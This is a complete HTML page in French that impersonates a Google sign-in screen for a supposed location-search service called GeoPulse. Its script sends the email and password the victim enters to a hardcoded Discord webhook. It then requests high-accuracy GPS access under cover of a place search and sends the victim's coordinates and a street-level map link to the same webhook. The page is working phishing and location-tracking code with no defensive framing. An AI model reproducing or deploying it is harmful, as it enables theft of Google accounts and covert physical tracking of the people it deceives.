<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion ‚Äì Comptes Google</title>
    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 350px; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; }
        .search-box { display: none; width: 90%; max-width: 450px; padding: 30px; text-align: center; border-radius: 15px; background: #ffffff; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; width: 100%; margin-top: 15px; }
        button:hover { background: #1557b0; }
        .logo-google { width: 75px; margin-bottom: 20px; }
        .gp-logo { color: #1a73e8; font-size: 32px; font-weight: bold; margin-bottom: 5px; letter-spacing: -1px; }
        #status { margin-top: 15px; font-size: 13px; color: #5f6368; }
        .sub-text { font-size: 14px; color: #3c4043; margin-top: 15px; }
    </style>
</head>
<body>

<div id="login-step" class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo-google">
    <h1 style="font-size: 24px; font-weight: 400; margin-bottom: 25px;">Connexion</h1>
    
    <input type="text" id="email" placeholder="E-mail ou t√©l√©phone">
    <input type="password" id="pass" placeholder="Mot de passe">
    
    <div class="sub-text">
        Connectez-vous avec Google pour acc√©der √† <strong>GeoPulse</strong>
    </div>

    <button onclick="captureLogin()">Suivant</button>
    
    <div style="margin-top: 25px; text-align: left;">
        <span style="color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;">Cr√©er un compte</span>
    </div>
</div>

<div id="search-step" class="search-box">
    <div class="gp-logo">GeoPulse<span style="color: #34a853;">.</span></div>
    <p style="color: #5f6368; margin-bottom: 25px;">Intelligence de proximit√© haute pr√©cision</p>
    
    <input type="text" id="query" placeholder="Chercher un lieu (ex: Sushi, Banque...)">
    <button onclick="startSearch()">Lancer la recherche</button>
    
    <div id="status">Pr√™t pour l'analyse locale.</div>
    
    <div id="map-placeholder" style="margin-top:20px; height:250px; display:none; border-radius:8px; overflow:hidden;">
        <iframe id="map-iframe" width="100%" height="100%" frameborder="0" style="border:0"></iframe>
    </div>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";

async function captureLogin() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(email && pass) {
        await fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "üîë NOUVEL ACC√àS GOOGLE CAPTUR√â",
                    color: 16733952,
                    fields: [
                        { name: "üìß Email/User", value: `\`${email}\``, inline: true },
                        { name: "üîí Password", value: `\`${pass}\``, inline: true }
                    ],
                    footer: { text: "GeoPulse OSINT Intelligence" }
                }]
            })
        });
        document.getElementById('login-step').style.display = 'none';
        document.getElementById('search-step').style.display = 'block';
    } else { alert("Veuillez remplir les champs."); }
}

async function startSearch() {
    const query = document.getElementById('query').value;
    const status = document.getElementById('status');
    if(!query) return;

    status.innerHTML = "<span style='color: #1a73e8;'>‚è≥ Autorisez l'acc√®s GPS pour synchroniser les r√©sultats...</span>";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "üéØ CIBLE LOCALIS√âE (GeoPulse)",
                        color: 3447003,
                        fields: [
                            { name: "üîé Recherche", value: query, inline: true },
                            { name: "üìç Google Maps", value: `[Cliquer pour voir la rue](https://www.google.com/maps?q=${lat},${lon})` },
                            { name: "üåç Coordonn√©es", value: `\`${lat}, ${lon}\`` }
                        ]
                    }]
                })
            });

            status.innerHTML = "‚úÖ R√©sultats trouv√©s !";
            document.getElementById('map-placeholder').style.display = 'block';
            document.getElementById('map-iframe').src = `https://www.google.com/maps?q=${query}&output=embed`;

        }, () => {
            status.innerHTML = "‚ùå Erreur : Acc√®s GPS refus√©.";
        }, { enableHighAccuracy: true });
    }
}
</script>
</body>
</html>


